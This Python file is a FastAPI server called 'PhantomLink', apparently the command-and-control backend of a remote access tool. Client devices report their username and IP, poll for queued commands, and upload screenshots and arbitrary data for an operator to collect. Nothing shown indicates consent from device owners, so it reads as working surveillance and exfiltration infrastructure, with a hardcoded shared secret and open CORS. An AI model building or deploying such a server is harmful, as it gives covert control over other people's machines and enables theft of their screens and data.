# main.py | PhantomLink Server | Render (FastAPI + uvicorn)
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from collections import deque
import time

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"]
)

SECRET = "phantomlink2025"

pending:  deque = deque(maxlen=200)
devices:  dict  = {}
data_buf: dict  = {}

class Command(BaseModel):
    secret: str
    action: str
    data:   str = ""
    target: str = "all"

class HeartBeat(BaseModel):
    secret:    str
    device_id: str
    username:  str
    ip:        str
    version:   str = "?"

class Screenshot(BaseModel):
    secret:    str
    device_id: str
    image:     str

class DataItem(BaseModel):
    secret:    str
    device_id: str
    type:      str
    payload:   str

def _auth(s: str):
    if s != SECRET:
        raise HTTPException(403, "denied")

@app.get("/")
async def root():
    return {"status": "PhantomLink online"}

@app.post("/heartbeat")
async def heartbeat(h: HeartBeat):
    _auth(h.secret)
    devices[h.device_id] = {
        "name":      h.username,
        "ip":        h.ip,
        "version":   h.version,
        "last_seen": time.time(),
    }
    return {"ok": True}

@app.get("/devices")
async def get_devices(secret: str):
    _auth(secret)
    now = time.time()
    return {
        did: {
            **info,
            "online": (now - info["last_seen"]) < 15,
        }
        for did, info in devices.items()
    }

@app.post("/send")
async def send_command(cmd: Command):
    _auth(cmd.secret)
    pending.append({
        "action": cmd.action,
        "data":   cmd.data,
        "target": cmd.target,
        "ts":     time.time()
    })
    return {"ok": True, "queued": len(pending)}

@app.get("/poll")
async def poll(secret: str, device_id: str):
    _auth(secret)
    for cmd in list(pending):
        if cmd["target"] in ("all", device_id):
            try:
                pending.remove(cmd)
            except ValueError:
                pass
            return cmd
    return {"action": "none", "data": ""}

@app.post("/screenshot")
async def upload_screenshot(s: Screenshot):
    _auth(s.secret)
    if s.device_id in devices:
        devices[s.device_id]["screenshot"] = s.image
    return {"ok": True}

@app.get("/screenshot")
async def get_screenshot(secret: str, device_id: str):
    _auth(secret)
    img = devices.get(device_id, {}).get("screenshot")
    return {"image": img}

@app.post("/data")
async def upload_data(item: DataItem):
    _auth(item.secret)
    if item.device_id not in data_buf:
        data_buf[item.device_id] = []
    data_buf[item.device_id].append({
        "type":    item.type,
        "payload": item.payload,
        "ts":      time.time()
    })
    data_buf[item.device_id] = data_buf[item.device_id][-20:]
    return {"ok": True}

@app.get("/data")
async def get_data(secret: str, device_id: str):
    _auth(secret)
    items = data_buf.pop(device_id, [])
    return {"items": items}
